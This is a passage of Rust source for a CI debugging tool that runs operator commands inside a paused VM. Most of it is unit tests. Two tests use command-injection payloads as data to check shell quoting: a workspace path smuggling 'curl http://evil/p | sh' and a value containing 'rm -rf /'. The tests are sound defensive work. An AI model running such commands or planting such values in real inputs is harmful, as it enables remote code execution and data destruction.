/// plane, so it is quoted like every other guest path. Unquoted, a job could
/// choose what runs the moment its operator types anything here.
fn guest_command_script(workspace: &str, command: &str) -> String {
    format!("cd {} 2>/dev/null; {command}", shell_quote(workspace))
}

/// Execute a command inside the paused VM.
fn run_in_guest(session: &DebugSession, command: &str) {
    let Some(machine) = &session.machine else {
        println!("  No VM recorded for this session — cannot run commands.");
        return;
    };
    let workspace = session.workspace.as_deref().unwrap_or("/");
    let script = guest_command_script(workspace, command);
    let status = std::process::Command::new("smolvm")
        .args([
            "machine", "exec", "--name", machine, "--", "sh", "-lc", &script,
        ])
        .stdin(std::process::Stdio::inherit())
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit())
        .status();
    match status {
        Ok(status) if !status.success() => {
            if let Some(code) = status.code() {
                println!("  (exit {code})");
            }
        }
        Ok(_) => {}
        Err(error) => println!("  could not exec in {machine}: {error}"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use aksh_gha_protocol::debug_session::{
        AttemptRecord, Diagnostic, FailedStep, SessionState, StepSummary,
    };
    use aksh_gha_protocol::{JobId, RunId};

    fn session() -> DebugSession {
        DebugSession {
            session_id: "dbg_abc123".into(),
            run_id: RunId::new(),
            job_id: JobId("build".into()),
            job_name: "build".into(),
            state: SessionState::Paused,
            version: 1,
            step: FailedStep {
                index: 3,
                total: 6,
                context_name: "__run_2".into(),
                display_name: "Run cargo test".into(),
                command: Some("cargo test --workspace\nsecond line".into()),
                working_directory: Some("/work".into()),
                exit_code: Some(101),
                elapsed_ms: 18_400,
                diagnostics: vec![Diagnostic {
                    level: "error".into(),
                    file: Some("crates/parser/src/lib.rs".into()),
                    line: Some(42),
                    column: None,
                    message: "expected `Completed`, found `Pending`".into(),
                }],
                log_excerpt: Some("noise\nmore noise".into()),
            },
            attempts: Vec::new(),
            attempt_changes: Vec::new(),
            job_steps: Vec::new(),
            machine: Some("preloop-runner-0-1".into()),
            workspace: Some("/work".into()),
            snapshot_commit: Some("deadbeef".into()),
            source_revision: "original".into(),
            controller: None,
            created_at_ms: 0,
            paused_seconds: 0,
        }
    }

    #[test]
    fn banner_prefers_diagnostics_over_the_log_excerpt() {
        let rendered = render_banner(&session());
        assert!(rendered.contains("crates/parser/src/lib.rs:42"));
        assert!(rendered.contains("expected `Completed`, found `Pending`"));
        assert!(
            !rendered.contains("more noise"),
            "the excerpt is a fallback and must not appear alongside diagnostics"
        );
    }

    #[test]
    fn banner_falls_back_to_the_excerpt_when_there_are_no_diagnostics() {
        let mut session = session();
        session.step.diagnostics.clear();
        let rendered = render_banner(&session);
        assert!(rendered.contains("more noise"));
    }

    #[test]
    fn banner_never_shows_a_countdown() {
        // Attached means no timeout. A ticking clock here would be a lie and
        // would rush someone who is reading code.
        let rendered = render_banner(&session());
        let lowered = rendered.to_lowercase();
        for forbidden in ["remaining", "expires", "countdown", "time left"] {
            assert!(
                !lowered.contains(forbidden),
                "banner must not mention `{forbidden}`"
            );
        }
    }

    #[test]
    fn banner_shows_step_position_and_detach_instructions() {
        let rendered = render_banner(&session());
        assert!(rendered.contains("4/6"), "1-based step position");
        assert!(rendered.contains("Ctrl-D"));
        assert!(rendered.contains(":retry"));
    }

    #[test]
    fn banner_marks_the_attempt_number_only_after_a_retry() {
        let mut session = session();
        // Match the header form specifically — the verb help legitimately
        // contains the word "attempt".
        assert!(!render_banner(&session).contains("· attempt "));
        session.attempts = vec![
            AttemptRecord {
                attempt: 1,
                outcome: "Failure".into(),
                exit_code: Some(101),
                elapsed_ms: 10,
                source_revision: "original".into(),
            },
            AttemptRecord {
                attempt: 2,
                outcome: "Failure".into(),
                exit_code: Some(101),
                elapsed_ms: 12,
                source_revision: "repair-1".into(),
            },
        ];
        assert!(render_banner(&session).contains("· attempt 2"));
    }

    #[test]
    fn multiline_commands_are_elided_to_one_line() {
        let rendered = render_banner(&session());
        assert!(rendered.contains("cargo test --workspace …"));
        assert!(!rendered.contains("second line"));
    }

    #[test]
    fn verdicts_parse_case_insensitively_and_reject_junk() {
        assert_eq!(parse_verdict("Retry").unwrap(), Verdict::Retry);
        assert_eq!(parse_verdict(" abort ").unwrap(), Verdict::Abort);
        assert_eq!(parse_verdict("continue").unwrap(), Verdict::Continue);
        assert!(parse_verdict("skip").is_err());
    }

    #[test]
    fn retry_from_accepts_start_number_and_unique_name() {
        let mut paused = session();
        paused.job_steps = (0..6)
            .map(|index| StepSummary {
                index,
                context_name: format!("step_{index}"),
                display_name: format!("Step {index}"),
            })
            .collect();

        assert_eq!(parse_retry_from(&paused, None, true).unwrap(), Some(0));
        assert_eq!(
            parse_retry_from(&paused, Some("2"), false).unwrap(),
            Some(1)
        );
        assert_eq!(
            parse_retry_from(&paused, Some("Step 0"), false).unwrap(),
            Some(0)
        );
    }

    #[test]
    fn retry_from_rejects_future_ambiguous_and_conflicting_selections() {
        let mut paused = session();
        paused.job_steps = vec![
            StepSummary {
                index: 0,
                context_name: "prepare".into(),
                display_name: "Prepare".into(),
            },
            StepSummary {
                index: 3,
                context_name: "build".into(),
                display_name: "Build".into(),
            },
            StepSummary {
                index: 4,
                context_name: "build_again".into(),
                display_name: "Build again".into(),
            },
        ];
        assert!(parse_retry_from(&paused, Some("5"), false).is_err());
        assert!(parse_retry_from(&paused, Some("Build"), false).is_err());
        assert!(parse_retry_from(&paused, Some("1"), true).is_err());
    }

    #[test]
    fn ansi_sequences_are_stripped_from_guest_output() {
        assert_eq!(strip_ansi("\u{1b}[36;1mhello\u{1b}[0m"), "hello");
        assert_eq!(strip_ansi("plain"), "plain");
    }

    #[test]
    fn revert_policies_parse_and_reject_junk() {
        assert_eq!(parse_revert("none").unwrap(), RevertPolicy::None);
        assert_eq!(parse_revert("Untracked").unwrap(), RevertPolicy::Untracked);
        assert_eq!(parse_revert(" all ").unwrap(), RevertPolicy::All);
        assert!(parse_revert("everything").is_err());
    }

    #[test]
    fn changes_render_with_category_guidance() {
        use aksh_gha_protocol::debug_session::ChangeStatus;
        let changes = vec![
            WorkspaceChange {
                path: "src/generated.rs".into(),
                status: ChangeStatus::Modified,
                category: ChangeCategory::Tracked,
            },
            WorkspaceChange {
                path: "build/stale".into(),
                status: ChangeStatus::Added,
                category: ChangeCategory::Untracked,
            },
        ];
        let rendered = render_changes(&changes);
        assert!(rendered.contains("src/generated.rs"));
        assert!(rendered.contains("restorable from the snapshot"));
        assert!(rendered.contains("build/stale"));
        assert!(rendered.contains("removable"));
        // The reason cache is excluded must be stated, not just implied.
        assert!(rendered.contains("warm state"));
    }

    #[test]
    fn no_changes_renders_a_definite_statement() {
        assert!(render_changes(&[]).contains("changed nothing"));
    }

    #[test]
    fn explicit_flags_skip_the_prompt() {
        // `--dirty` and `--clean` exist so an agent never blocks on stdin.
        let mut session = session();
        session.attempt_changes = vec![WorkspaceChange {
            path: "src/lib.rs".into(),
            status: aksh_gha_protocol::debug_session::ChangeStatus::Modified,
            category: ChangeCategory::Tracked,
        }];
        assert_eq!(
            choose_revert(&session, &["--dirty"]),
            Some(RevertPolicy::None)
        );
        assert_eq!(
            choose_revert(&session, &["--clean"]),
            Some(RevertPolicy::All)
        );
    }

    #[test]
    fn an_untouched_workspace_needs_no_prompt() {
        // Nothing to undo means nothing to ask about.
        assert_eq!(choose_revert(&session(), &[]), Some(RevertPolicy::None));
    }

    #[test]
    fn source_revisions_advance_monotonically() {
        assert_eq!(next_revision("original"), "repair-1");
    }

    /// A workspace path from the control plane must not be able to inject a
    /// second command into the operator's shell.
    #[test]
    fn a_hostile_workspace_path_cannot_inject_a_guest_command() {
        let script = guest_command_script("/w; curl http://evil/p | sh; #", "ls");
        assert!(
            script.starts_with("cd '/w; curl http://evil/p | sh; #'"),
            "workspace must be quoted, got: {script}"
        );
        // The payload survives only as literal text inside the `cd` argument.
        assert!(!script.contains("; curl http://evil/p | sh; #' 2>/dev/null; curl"));
        assert!(script.ends_with("2>/dev/null; ls"));
    }

    #[test]
    fn shell_quoting_neutralizes_embedded_quotes() {
        // Paths reach `sh -lc` as arguments. An unescaped apostrophe would
        // close the string and execute whatever followed it.
        assert_eq!(shell_quote("/work/a b"), "'/work/a b'");
        // Every apostrophe becomes the standard `'\''` close-escape-reopen
        // sequence, so the payload stays a single literal argument.
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        assert_eq!(shell_quote("'; rm -rf /; '"), r"''\''; rm -rf /; '\'''");
    }

    #[test]
    fn source_revision_sequence_is_monotonic() {
        assert_eq!(next_revision("original"), "repair-1");
        assert_eq!(next_revision("repair-1"), "repair-2");
        assert_eq!(next_revision("repair-9"), "repair-10");
    }
}
